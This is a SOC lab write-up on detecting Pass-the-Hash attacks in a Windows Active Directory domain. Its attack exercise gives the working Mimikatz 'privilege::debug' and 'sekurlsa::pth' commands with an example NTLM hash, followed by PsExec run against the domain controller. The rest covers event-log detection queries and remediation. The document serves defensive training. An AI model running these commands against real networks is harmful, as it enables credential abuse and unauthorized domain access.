# Pass the Hash Detection Lab 04: Advanced Windows Attack Analysis and Incident Response

## Lab Overview

**Lab Focus:** Advanced Windows authentication attack analysis, Pass-the-Hash detection, and comprehensive incident response for enterprise domain environments  
**Difficulty:** Expert   
**Author:** Mykyta Palamarchuk  
**Role:** SOC Analyst | Windows Security & Advanced Threat Detection  
**Certification:** CompTIA Security+ (SY0-701)

### Environment Specifications
- **Platform:** Windows domain environment with Active Directory infrastructure
- **Administrative Privileges:** Domain administrator access and security log analysis permissions
- **Business Context:** Enterprise domain security assessment and incident response
- **Technology Focus:** Authentication attacks, event log correlation, advanced threat detection

---

## Learning Objectives

Upon completion of this lab, participants will demonstrate:

1. **Windows authentication mechanism understanding** including normal password-based and hash-based authentication techniques
2. **Advanced attack methodology proficiency** executing and analyzing Pass-the-Hash attacks using enterprise security tools
3. **Event log correlation expertise** identifying attack signatures through Windows Security log analysis and XPATH filtering
4. **Threat detection capabilities** differentiating between legitimate authentication and malicious credential usage patterns
5. **Incident response proficiency** implementing account compromise detection and remediation procedures
6. **Enterprise security assessment skills** conducting comprehensive domain controller security analysis

---

## Business Scenario

You are a domain administrator at Commensurate Technology conducting security research to understand Windows authentication vulnerabilities and detection capabilities. Your objective is to analyze Pass-the-Hash attack techniques, implement detection mechanisms through event log analysis, and establish incident response procedures for credential compromise scenarios in enterprise domain environments.

---

## Lab Exercises

### Exercise 1: Normal Authentication Analysis and Baseline Establishment

#### Task 1.1: Standard Domain Authentication with PsExec

**Objective:** Establish baseline authentication patterns using standard password-based domain authentication.

**PsExec Authentication Framework:**
PsExec extends Windows administrative capabilities for remote command execution via PsExec service implementation, requiring administrator privileges for domain controller access.

**Authentication Syntax:**
```cmd
PsExec.exe -i \\<server> -u <user> -p <password> <command>
```

**Parameters:**
- **`-i`** - Interactive desktop session for remote system interaction
- **Error Code 0** - Successful execution indicator for all Windows applications

**Standard Authentication Execution:**
```cmd
C:\Tools\SysinternalsSuite\PsExec.exe -i \\dc1.commensurate.tech -u emmanueltoller -p t0tallySecre7? whoami.exe
```

![PsExec Normal Authentication](https://raw.githubusercontent.com/Mustangrim/SOC-Incident-Response-Framework/main/assets/screenshots/psexec-normal-authentication.png)

**Authentication Analysis:**
- **User Account:** emmanueltoller
- **Authentication Method:** Password-based domain authentication
- **Target System:** dc1.commensurate.tech (domain controller)
- **Command Execution:** whoami.exe for identity verification

**Security Baseline:** Normal authentication generates comprehensive Windows Security logs including explicit credential usage events essential for attack pattern differentiation.

---

### Exercise 2: Pass-the-Hash Attack Implementation and Analysis

#### Task 2.1: Mimikatz Privilege Escalation and Debug Access

**Objective:** Implement Pass-the-Hash attack methodology using Mimikatz for credential manipulation and hash-based authentication.

**Mimikatz Privilege Establishment:**
Pass-the-Hash attacks require debug privileges for memory access and credential manipulation in Windows authentication subsystems.

```cmd
privilege::debug
```

![Mimikatz Privilege Debug](https://raw.githubusercontent.com/Mustangrim/SOC-Incident-Response-Framework/main/assets/screenshots/mimikatz-privilege-debug.png)

**Debug Privilege Significance:** Administrative debug access enables memory credential extraction and token manipulation essential for advanced authentication attacks.

#### Task 2.2: Hash-Based Authentication Implementation

**Objective:** Execute Pass-the-Hash attack using NTLM hash for domain controller authentication without password knowledge.

**Mimikatz Pass-the-Hash Syntax:**
```cmd
sekurlsa::pth /user:<account> /domain:<domain> /ntlm:<ntlm-hash>
```

**Attack Implementation:**
```cmd
sekurlsa::pth /user:enolabarnet /domain:commensurate.tech /ntlm:206775b2946c5f22a5310222f759fe89
```

![Mimikatz PTH Execution](https://raw.githubusercontent.com/Mustangrim/SOC-Incident-Response-Framework/main/assets/screenshots/mimikatz-pth-execution.png)

**Credential Injection Process:** Mimikatz clones current authentication token and injects NTLM hash for outbound network connections, enabling domain controller access without password knowledge.

#### Task 2.3: Compromised Shell Utilization

**Objective:** Utilize compromised authentication context for domain controller command execution.

**Spawned Shell Analysis:**
Mimikatz creates new command prompt with injected credentials loaded for default user context.

![Spawned Shell Credentials](https://raw.githubusercontent.com/Mustangrim/SOC-Incident-Response-Framework/main/assets/screenshots/spawned-shell-credentials.png)

**PsExec Execution in Compromised Context:**
```cmd
C:\Tools\SysinternalsSuite\PsExec.exe -i \\dc1.commensurate.tech whoami.exe
```

![PsExec PTH Execution](https://raw.githubusercontent.com/Mustangrim/SOC-Incident-Response-Framework/main/assets/screenshots/psexec-pth-execution.png)

**Attack Analysis:**
- **Compromised Account:** enolabarnet
- **NTLM Hash:** 206775b2946c5f22a5310222f759fe89
- **Authentication Method:** Hash injection without password knowledge
- **Result:** Successful domain controller access using stolen credentials

**Security Implication:** Pass-the-Hash attacks enable unauthorized domain access using only credential hashes, bypassing traditional password-based security controls.

---

### Exercise 3: Event Log Analysis and Attack Detection

#### Task 3.1: Security Log Correlation and Event Identification

**Objective:** Analyze Windows Security logs for authentication pattern differences between normal and Pass-the-Hash attacks.

**PowerShell Event Query Methodology:**
```powershell
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/Data="<username>"' -MaxEvents 20 -ComputerName dc1.commensurate.tech
```

**Normal Authentication Analysis:**
```powershell
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/Data="emmanueltoller"' -MaxEvents 20 -ComputerName dc1.commensurate.tech
```

**Pass-the-Hash Authentication Analysis:**
```powershell
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/Data="enolabarnet"' -MaxEvents 20 -ComputerName dc1.commensurate.tech
```

**Event Correlation Results:**
- **Event ID 4648** - "Logon attempted using explicit credentials" (present in normal authentication)
- **Missing 4648 Events** - Pass-the-Hash authentication lacks explicit credential events
- **Authentication Pattern Differentiation** - Event presence indicates authentication methodology

#### Task 3.2: Logon Type Analysis for Attack Identification

**Objective:** Identify Pass-the-Hash attacks using Windows logon type analysis and event filtering.

**Logon Type 9 Significance:**
Pass-the-Hash attacks generate Logon Type 9 (NewCredentials) events when users clone authentication tokens with new credentials for outbound connections.

**Logon Type 9 Detection Query:**
```powershell
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/EventID="4624" and */*/*/Data[@Name="LogonType"]="9"' -MaxEvents 20 -ComputerName dc1.commensurate.tech
```

**Advanced Event Filtering:**
```powershell
# User-specific logon type analysis
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/EventID="4624" and */*/*/Data="enolabarnet"' -MaxEvents 20

# Output formatting for detailed analysis
... | Format-List

# String pattern searching
... | findstr /R /C:'Logon Type:'
```

**Detection Methodology:** Logon Type 9 events combined with missing Event ID 4648 provide reliable indicators for Pass-the-Hash attack identification.

---

### Exercise 4: Comprehensive Threat Hunting and Additional Account Analysis

#### Task 4.1: Enterprise-Wide Pass-the-Hash Detection

**Objective:** Conduct comprehensive threat hunting to identify additional compromised accounts using Pass-the-Hash techniques.

**Domain-Wide Logon Type 9 Analysis:**
```powershell
Get-WinEvent -LogName 'Security' -FilterXPath '*/*/*/EventID="4624" and */*/*/Data[@Name="LogonType"]="9"' -MaxEvents 20 -ComputerName dc1.commensurate.tech
```

**Threat Hunting Results:**
Analysis reveals additional user accounts exhibiting Logon Type 9 patterns indicating potential Pass-the-Hash compromise across enterprise infrastructure.

**Compromise Scope Assessment:**
- **Primary Compromised Account:** enolabarnet (confirmed Pass-the-Hash usage)
- **Additional Suspicious Accounts:** [Identified through logon type analysis]
- **Attack Timeline:** Event timestamp correlation for incident reconstruction
- **Impact Assessment:** Domain controller access scope and unauthorized activity evaluation

---

### Exercise 5: Incident Response and Account Remediation

#### Task 5.1: Compromised Account Identification and Response

**Objective:** Implement immediate incident response procedures for identified account compromise.

**Account Compromise Indicators:**
- **Logon Type 9 Events** - Pass-the-Hash attack signatures
- **Missing Event ID 4648** - Absence of explicit credential authentication
- **Unusual Authentication Patterns** - Hash-based access without password validation

#### Task 5.2: Account Security Remediation

**Objective:** Execute immediate account remediation to prevent continued unauthorized access.

**Password Reset Implementation:**
```cmd
net user <username> <newpassword> /domain
```

**Remediation Procedure:**
1. **Immediate Password Reset** - Invalidate compromised credential hashes
2. **Account Activity Review** - Audit unauthorized access and data exposure
3. **Security Log Analysis** - Complete incident timeline reconstruction
4. **Additional Account Assessment** - Comprehensive domain compromise evaluation

**Post-Incident Security Enhancement:**
- **Credential Management** - Enhanced password policies and rotation schedules
- **Authentication Monitoring** - Continuous Logon Type 9 detection implementation
- **Access Control Review** - Privileged account access restriction and monitoring
- **Security Training** - User education on credential protection and attack recognition

---

## Technical Assessment

### Attack Methodology Understanding
- Normal vs Pass-the-Hash authentication technique differentiation
- Mimikatz tool usage for credential manipulation and hash injection
- PsExec implementation for remote command execution in compromised contexts

### Event Log Analysis Proficiency
- Windows Security log correlation and event identification
- XPATH filtering for precise event targeting and analysis
- Logon type analysis for attack pattern recognition and threat hunting

### Threat Detection Capabilities
- Pass-the-Hash attack signature identification through event correlation
- Missing event analysis for authentication method determination
- Comprehensive threat hunting across enterprise domain infrastructure

### Incident Response Implementation
- Compromised account identification through systematic log analysis
- Immediate remediation procedures for credential compromise containment
- Post-incident security enhancement and monitoring implementation

---

## SOC Applications

### Operational Use Cases
- **Advanced Threat Detection:** Pass-the-Hash attack identification through behavioral analysis
- **Incident Response Coordination:** Rapid compromise detection and containment procedures
- **Threat Hunting Operations:** Proactive credential compromise identification across enterprise domains
- **Security Assessment:** Authentication vulnerability testing and detection capability validation

### Security Metrics Enhancement
- **Mean Time to Detection:** Rapid Pass-the-Hash attack identification through automated event correlation
- **Incident Response Effectiveness:** Systematic compromise detection and immediate remediation implementation
- **Threat Hunting Efficiency:** Comprehensive enterprise-wide credential compromise assessment
- **Security Posture Improvement:** Enhanced authentication monitoring and attack prevention capabilities

---

## Lab Completion

**Skills Validated:**
- Advanced Windows authentication attack analysis and implementation
- Comprehensive event log correlation for sophisticated threat detection
- Pass-the-Hash attack identification through systematic security analysis
- Enterprise incident response and compromised account remediation
- Advanced threat hunting across domain infrastructure environments

**Technical Competencies:**
- Windows domain security assessment and vulnerability analysis
- Advanced authentication attack methodology and detection techniques
- Security event correlation and threat pattern recognition
- Incident response leadership and security remediation implementation

---

## Course Completion 

✅ **Lab 01:** Linux System Reconnaissance - Foundation infrastructure analysis  
✅ **Lab 02:** Linux Syslog Analysis - Log investigation and authentication monitoring  
✅ **Lab 03:** Windows Process Monitoring - Advanced malware detection and system analysis  
✅ **Lab 04:** Pass the Hash Detection - Advanced Windows attack analysis and incident response  

**Professional Skills Achieved:**
- **Multi-Platform Security Expertise:** Comprehensive Linux and Windows security operations
- **Advanced Threat Detection:** Sophisticated attack pattern recognition and analysis
- **Incident Response Leadership:** Systematic investigation and remediation implementation
- **Enterprise Security Assessment:** Infrastructure analysis and vulnerability identification
- **Security Tool Mastery:** Professional-grade security tool implementation and optimization

